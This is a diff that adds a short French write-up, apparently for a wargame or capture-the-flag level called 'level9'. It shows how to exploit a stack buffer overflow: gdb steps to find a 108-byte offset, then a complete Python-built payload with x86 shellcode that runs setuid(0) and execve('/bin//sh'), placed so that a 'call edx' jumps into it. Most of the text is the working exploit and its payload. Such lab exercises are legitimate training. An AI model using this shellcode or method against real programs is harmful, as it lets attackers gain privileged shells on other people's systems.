@@ -1,0 +1,25 @@
+Ici le but est de mettre l'addresse de notre shellcode dans edx car
+l'asm nous montre a la fin un call a edx -> 0x08048693 <+159>:	call   edx
+
+gdb level9
+
+r `python -c 'print "A" * 110'`
+
+...
+...
+...
+
+offset == 108
+
+x/x $esp
+
+x/50x <espAddress> -> recuperer l'addresse de notre variable contenant tout les AAAAA
+
+Le but maintenant est de placer notre shellcode dans la variable et de donner l'addresse de notre variable a edx
+
+`python -c 'print "\x10\xa0\x04\x08" + "\x31\xc0\x89\xc3\xb0\x17\xcd\x80\x31\xd2\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x52\x53\x89\xe1\x8d\x42\x0b\xcd\x80" + "A" * 72 + "\x0c\xa0\x04\x08"'`
+
+						^											^																															^
+						|											|																															|
+					addresse de 						notre shellcode qui sera dans la variable																						addresse de notre variable
+					la variable + 4									
